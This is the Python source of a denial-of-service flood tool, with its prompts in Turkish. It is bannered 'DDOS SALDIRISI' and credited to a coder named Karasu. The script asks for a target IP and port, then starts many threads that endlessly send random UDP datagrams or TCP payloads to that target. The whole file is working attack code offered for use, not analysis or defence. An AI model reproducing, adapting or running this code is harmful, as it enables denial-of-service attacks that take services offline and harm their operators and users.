import signal
import time
import socket
import random
import threading
import sys
import os
from os import system, name

print("\033[1;34;40m \n")
os.system("figlet DDOS SALDIRISI -f slant")
print("\033[1;33;40m Herhangi bir sorun yaşarsanız: https://github.com/XaviFortes/Python-UDP-Flood/issues\n")

print("\033[1;32;40m ==> Kodlayan: Karasu <==  \n")
test = input("Devam etmek istiyor musun? (n = hayır): ")
if test == "n":
	exit(0)
ip = str(input(" Hedef IP veya Host: "))
port = int(input(" Port: "))
choice = str(input(" UDP kullanılsın mı? (y/n): "))
times = int(input(" Bir bağlantı başına gönderilecek paket sayısı: "))
threads = int(input(" Açılacak thread (iş parçacığı) sayısı: "))

def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for x in range(times):
				s.sendto(data, addr)
			print(i + " UDP Paketi Gönderildi!")
		except:
			s.close()
			print("[!] Hata oluştu!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i + " TCP Paketi Gönderildi!")
		except:
			s.close()
			print("[*] Hata oluştu")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target=run)
		th.start()
	else:
		th = threading.Thread(target=run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target=run)
			th.start()
		else:
			th = threading.Thread(target=run2)
			th.start()

def whereuwere():
	print("Üzgünüm, UDP mi TCP mi kullandığını hatırlayamadım.")
	print("UDP için 1, TCP için 2 yaz.")
	whereman = str(input(" 1 ya da 2 > "))
	if whereman == '1':
		run()
	else:
		run2()

def clear():
	if name == 'nt':
		_ = system('cls')
	else:
		_ = system('clear')

def byebye():
	clear()
	os.system("figlet Güle Güle -f slant")
	sys.exit(130)

def exit_gracefully(signum, frame):
	signal.signal(signal.SIGINT, original_sigint)
	try:
		exitc = str(input(" Çıkmak istiyor musun? (y = evet): "))
		if exitc == 'y':
			byebye()
	except KeyboardInterrupt:
		print("Tamam tamam, çıkılıyor...")
		byebye()
	signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
	original_sigint = signal.getsignal(signal.SIGINT)
	signal.signal(signal.SIGINT, exit_gracefully)
